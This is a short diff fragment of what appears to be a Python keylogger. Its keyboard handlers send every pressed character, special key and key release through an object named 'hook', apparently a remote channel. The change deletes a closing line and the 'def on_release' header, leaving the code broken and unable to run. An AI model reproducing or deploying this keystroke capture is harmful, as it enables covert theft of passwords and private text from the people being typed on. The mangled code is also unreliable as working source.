@@ -9,9 +9,7 @@ def on_press(key):
             key.char))
     except AttributeError:
         hook.send('special key {0} pressed'.format(
-            key))
 
-def on_release(key):
     hook.send('{0} released'.format(
         key))
     if key == keyboard.Key.esc:
